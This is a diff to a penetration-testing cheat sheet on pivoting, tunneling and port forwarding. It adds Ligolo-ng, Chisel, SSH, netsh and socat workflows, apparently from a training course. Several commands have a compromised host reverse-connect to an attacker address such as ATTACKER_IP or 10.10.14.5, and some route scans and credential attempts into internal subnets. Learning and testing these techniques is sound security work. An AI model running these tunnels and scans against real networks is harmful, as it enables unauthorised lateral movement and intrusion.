@@ -1,6 +1,53 @@
-| Command                                                      | Description                                                  |
-| ------------------------------------------------------------ | ------------------------------------------------------------ |
-| `ifconfig`                                                     | Linux-based command that displays all current network configurations of a system. |
+# Pivoting, Tunneling, and Port Forwarding
+
+**2026 Update**: For most internal network access, prefer **Ligolo-ng** (transparent L3 TUN) over traditional SOCKS/chisel where possible. Chisel and SSH remain useful for quick targeted forwards.
+
+## Initial Network Enumeration
+
+| Command | Description |
+|---------|-------------|
+| `ifconfig` / `ip a` | Linux network config |
+| `ipconfig` / `ipconfig /all` | Windows |
+| `netstat -r` ; `route print` | Routing table |
+| `ss -tuln` ; `netstat -antp` | Listening ports |
+
+## Ligolo-ng (Recommended for Transparent Pivots)
+
+```bash
+# On attacker (Kali) — start server
+./ligolo-ng -selfcert
+
+# On target (after uploading agent) — run agent (reverse connect)
+./agent -connect ATTACKER_IP:11601 -ignore-cert
+
+# Attacker: create interface & add route
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+sudo ip route add 172.16.5.0/24 dev ligolo   # internal range
+
+# In ligolo-ng console
+session   # select
+start     # start tunneling
+```
+
+Then use native tools: `nmap 172.16.5.10`, `crackmapexec`, etc. No proxychains needed for most.
+
+See: https://github.com/nicocha30/ligolo-ng
+
+## Chisel (Still Excellent for Simple Cases)
+
+```bash
+# Server (attacker)
+./chisel server -v -p 1234 --socks5 --reverse
+
+# Client on pivot target
+./chisel client ATTACKER:1234 R:socks
+
+# Use with proxychains
+proxychains nmap -sT -Pn ...
+```
+
+## SSH Tunneling Basics (Still Core)
 | `ipconfig`                                                     | Windows-based command that displays all system network configurations. |
 | `netstat -r`                                                   | Command used to display the routing table for all IPv4-based protocols. |
 | `nmap -sT -p22,3306 <IPaddressofTarget>`                       | Nmap command used to scan a target for open ports allowing SSH or MySQL connections. |
@@ -69,3 +116,76 @@
 | `ssh -p2222 -lubuntu 127.0.0.1`                                | SSH command used to connect to an SSH server through a local port. This can be used to tunnel SSH traffic through an ICMP tunnel. |
 | `regsvr32.exe SocksOverRDP-Plugin.dll`                         | Windows-based command used to register the SocksOverRDP-PLugin.dll. |
 | `netstat -antb \|findstr 1080`                                 | Windows-based command used to list TCP network connections listening on port 1080. |
+
+## 2026 Recommendations & Other Tools
+
+- **Ligolo-ng first** for full network access.
+- Chisel for lightweight reverse SOCKS when agent deployment is constrained.
+- SSH `-L` / `-R` / `-D` for quick single forwards and dynamic SOCKS.
+- Socat for advanced port relay.
+- `sshuttle` for easy subnet routing over SSH.
+- Metasploit `portfwd`, autoroute, socks_proxy still work but heavier.
+- For Windows targets: Plink (PuTTY), netsh portproxy, SocksOverRDP.
+- dnscat2 / icmp tunnels for extreme egress (less common).
+- Modern C2 (Sliver, Havoc, etc.) often have built-in pivoting.
+
+Example netsh (Windows pivot host):
+```cmd
+netsh interface portproxy add v4tov4 listenport=4444 listenaddress=0.0.0.0 connectport=3389 connectaddress=172.16.5.25
+```
+
+Always clean up tunnels and monitor with `ss -tuln`, `netstat`.
+
+## Concrete Full Examples
+
+### Ligolo-ng Multi-hop Style
+```bash
+# Attacker
+./ligolo-ng -selfcert
+sudo ip route add 10.10.20.0/24 dev ligolo
+
+# On first pivot (Linux)
+./agent -connect 10.10.14.5:11601 -ignore-cert
+
+# Inside ligolo console
+session 1
+start
+# Now nmap 10.10.20.0/24 works natively from attacker
+```
+
+### Chisel + Proxychains Full Workflow
+```bash
+# Attacker
+./chisel server -p 1234 --socks5 --reverse
+
+# Target pivot
+./chisel client 10.10.14.5:1234 R:socks
+
+# Attacker
+echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
+proxychains nmap -sT -Pn -p 445,3389,5985 172.16.5.10-50
+proxychains crackmapexec smb 172.16.5.10 -u user -p pass
+```
+
+### Multiple SSH Tunnels
+```bash
+# Local forward DB
+ssh -L 3306:127.0.0.1:3306 user@pivot
+
+# Dynamic (SOCKS)
+ssh -D 9050 user@pivot
+
+# Reverse tunnel (expose local service to target network)
+ssh -R 8080:127.0.0.1:80 user@pivot
+```
+
+### Socat Relays
+```bash
+# Forward local port to remote
+socat TCP4-LISTEN:4444,fork TCP4:internal:3389
+
+# Bidirectional relay
+socat -v TCP4-LISTEN:1234,fork TCP4:10.10.14.5:4444
+```
+
+References: Ligolo-ng repo, HackTricks pivoting, Chisel docs.
